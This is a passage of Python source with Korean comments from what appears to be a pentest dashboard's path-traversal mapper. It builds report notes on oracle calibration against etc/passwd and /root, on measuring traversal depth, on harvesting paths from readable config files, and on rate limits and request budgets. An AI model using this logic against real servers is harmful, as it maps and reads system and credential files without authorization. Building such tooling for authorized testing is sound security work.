                "권한이 없어도 옵니다 — 실서버에서 `/root` 는 500 인데 분명히 존재하는 "
                "`/root/.bashrc` 는 404 였습니다. 그래서 404 경로는 표에 올리지 않습니다.")
    note.append("**'못 들어감' 은 파일인지 디렉터리인지 가리지 못한 것입니다.** 읽기 권한이 "
                "없는 파일(ENOTDIR)과 탐색 권한이 없는 디렉터리(EACCES)가 같은 404 를 주기 "
                "때문입니다. 보고서에 '파일이다' 로 쓰면 틀립니다.")
    if harvested_total:
        note.append("**수확 %d개** — 읽힌 설정 파일 안에 적힌 절대경로를 뽑아 다시 때렸습니다. "
                    "`jdk-11.0.24+8` 처럼 버전이 든 이름은 어떤 사전에도 없고 이 길로만 나옵니다. "
                    "파일 내용은 경로를 뽑는 데만 쓰고 **어디에도 저장하지 않습니다**(요청 기록에도 "
                    "본문이 남지 않습니다) — 설정 파일에는 자격증명이 섞여 있습니다."
                    % harvested_total)
        note.append("**수확으로도 안 나오는 것이 있습니다.** 수확은 읽히는 파일(200)에서만 됩니다 — "
                    "500(있는데 못 읽음)에서는 이름을 캘 수 없습니다. 난수가 든 저장 파일명"
                    "(`9041a34f_...`)은 설정 파일에도 안 적혀 있어 DB 쪽에서 얻어야 합니다.")
    else:
        note.append("찾지 못한 것이 없다는 뜻은 아닙니다. 이름을 맞혀야만 찾습니다 — "
                    "`jdk-11.0.24+8` 처럼 버전이 든 이름은 어떤 사전에도 없습니다. "
                    "읽힌 파일이 없어 수확할 것도 없었습니다. 설정 파일을 하나라도 읽으면 "
                    "거기 적힌 경로를 자동으로 따라갑니다.")
    if cut:
        note.append("사전이 길어 앞에서부터 %d개만 읽었습니다." % limit)
    # 벽이 섰으면 **가장 먼저** 적는다. 이 아래 어떤 숫자도 믿을 수 없기 때문이다.
    if bad_end:
        note.insert(0, "**이 지도는 검증되지 않았습니다.** 시작 때 통한 오라클이 "
                       "끝에서는 통하지 않습니다(%s). 도중에 막혔다는 뜻이고, 막힌 "
                       "뒤의 탐색은 전부 '없음'처럼 보였습니다 — **안 나온 경로를 "
                       "'없다'로 읽지 마세요.** 잠시 뒤 다시 돌려 같은 지도가 나오는지 "
                       "확인하세요."
                       % " · ".join("%s: %s → %s" % (g["path"],
                                                     LABEL.get(g["want"], g["want"]),
                                                     LABEL.get(g["got"], g["got"]))
                                    for g in bad_end))
    elif gates_end:
        note.append("**끝에서 교정을 한 번 더 해 %d/%d 통과했습니다.** 시작 때만 "
                    "확인하면, 도중에 막혀 잘린 지도를 완전한 지도로 보고하게 됩니다."
                    % (len(gates_end) - len(bad_end), len(gates_end)))

    # 버려진 응답도 센다 — 403·429 는 '없음'이 아니라 **막혔다**는 신호다.
    noteworthy = {k: v for k, v in walker.codes.items()
                  if k not in (READABLE, EXISTS, UNSTAT) and v}
    if noteworthy:
        note.append("**뜻을 모르는 응답 %s 를 받았습니다.** 403 은 탈출 검사에 걸린 것이고, "
                    "429 처럼 목록에 없는 코드는 속도 제한일 수 있습니다 — 그런 응답이 온 "
                    "경로는 '없다'가 아니라 **판정 못 함**입니다."
                    % " · ".join("%s %d건" % (LABEL.get(k, k), v)
                                 for k, v in sorted(noteworthy.items())))
    unclear = [x for x in nodes if x.get("probe_inconclusive")]
    if unclear:
        note.append("종류를 가리려 '/..' 를 때렸는데 **뜻을 모르는 응답이 온 곳이 %d곳**입니다 "
                    "— 표에 '미판별' 로 남았습니다. 디렉터리가 아니라는 뜻이 아닙니다."
                    % len(unclear))

    if gates:
        note.append("**오라클 교정 %d/%d 통과** — 답을 아는 경로(`etc/passwd` 200 · `etc` 500 · "
                    "`etc/..` 500 · `etc/passwd/..` 404)로 응답 코드가 뜻을 갖는지 먼저 "
                    "확인했습니다. 뒤 두 개는 종류 가리기가 의지하는 성질이라, 이것이 통하지 "
                    "않으면 '디렉터리' 판정 전체가 무효입니다."
                    % (len(gates) - len(bad_gates), len(gates)))
    if depth_auto and depth_measured:
        note.append("**올라갈 단계를 직접 재서 %s 를 썼습니다**(%d번 시도). 고정값을 쓰면 "
                    "배포가 바뀔 때 전부 404 로 와서 '아무것도 없는 서버' 로 보입니다."
                    % (depth_measured, len(depth_tried)))
    elif depth_auto:
        # 재는 데 실패했으면 **그렇게 적는다.** 전에는 자리값 9 를 '재서 썼다' 고
        # 적어, 측정하지 않은 값을 측정값으로 보고했다(11-06 검수).
        note.append("**올라갈 단계를 재지 못해 %s 를 그대로 썼습니다**(%d번 시도). "
                    "`etc/passwd` 가 어느 단계에서도 읽히지 않았습니다 — 이 값은 "
                    "측정값이 아니라 자리값입니다." % (depth, len(depth_tried)))
    if expanded_dirs:
        note.append("**넓힌 곳 %d곳** — 찾은 디렉터리 전부에 사전을 조금씩 뿌리지 않고, "
                    "순위를 매겨 앞에 선 곳에 이름 목록을 통째로 줬습니다. 순위는 "
                    "`씨앗이 그 아래를 모른다` + `수확이 알려 준 배포 경로 아래다` 입니다 — "
                    "11-04 실측에서 적중이 난 곳이 전부 이 둘을 만족했습니다. 넓힌 곳: %s"
                    % (len(expanded_dirs), ", ".join(expanded_dirs)))
    if clamped:
        note.append("**요청 상한을 %d → %d 로 줄였습니다.** 앱 전체 한도"
                    "(`DASH_MAX_REQUESTS` = %d)가 더 작기 때문입니다 — 그대로 보내면 "
                    "보내는 쪽에서 멈춰 **지도가 아예 안 나옵니다.** 더 넓게 그리려면 "
                    "대시보드를 띄우기 전에 그 환경변수를 올리세요."
                    % (clamped, budget, app_cap))
    if over:
        note.append("**요청 상한 %d건에 닿아 멈췄습니다.** 경로 %d개까지 때렸습니다 — "
                    "넓히기가 중간에서 끊겼다는 뜻이고, 안 때린 곳은 '없다'가 아니라 "
                    "'안 봤다' 입니다. '요청 상한' 을 올리거나(최대 %d) '확장만' 모드로 "
                    "기준 디렉터리를 좁혀 다시 돌리세요." % (budget, len(targets), MAX_REQUESTS))
    elif out_of_budget:
        note.append("**요청이 모자라 넓히기를 중간에 멈췄습니다**(%d건 남겼습니다 — 찾은 것의 "
                    "종류를 가리는 데 쓸 몫입니다). 안 넓힌 디렉터리는 '없다'가 아니라 "
                    "**'안 봤다'** 입니다. '요청 상한'(지금 %d · 최대 %d)을 올리거나 "
                    "'확장만' 모드로 그 디렉터리를 직접 지정하세요."
                    % (walker.left, budget, MAX_REQUESTS))
    elif rounds_used_up:
        note.append("**바퀴 상한 %d 을 다 썼습니다.** 아직 안 넓힌 디렉터리가 남아 있습니다 "
                    "— '더 나올 것이 없다'는 뜻이 **아닙니다**(요청은 %d건 남았습니다). "
                    "한 바퀴에 한 단계씩 내려가므로, 더 깊은 배포 구조는 다시 돌리거나 "
                    "'확장만' 모드로 그 디렉터리를 직접 지정하면 이어서 그려집니다."
                    % (MAX_ROUNDS, walker.left))
    elif mode == "pipeline" and loops and not bad_end:
        note.append("%d바퀴 돌고 **새로 찾은 것이 없어 스스로 멈췄습니다** — 예산이 모자라 "
                    "끊긴 것이 아닙니다(%d건 남김)." % (loops, walker.left))
    if bad:
        note.append("사전에서 경로 조각으로 쓸 수 없는 %d줄을 건너뛰었습니다(슬래시·'..' 포함)." % bad)
    if auth_stop:
        note.append("**401 을 받아 중간에 멈췄습니다.** 토큰이 없거나 만료됐습니다 — "
                    "이대로 두면 전부 404·401 로 보여 '아무것도 없다'는 거짓 지도가 됩니다.")

    return ToolResult(
        summary="%s · 때린 경로 %d · 읽힘 %d · 디렉터리 %d · 못 들어감 %d · 요청 %d건%s"
                % (" → ".join("%s %d" % s for s in stages) or "—",
                   len(targets), len(readable), len(dirs), len(opaque), sent,
                   (" (그중 단서 %d)" % len(outside)) if outside else ""),
        columns=["경로", "응답", "크기", "종류", "결과", "출처"],
        rows=rows, drills=drills,
        text=(_tree(nodes) + _provenance(mine, outside)) if nodes else "",
        findings=findings,
        note=" ".join(note))
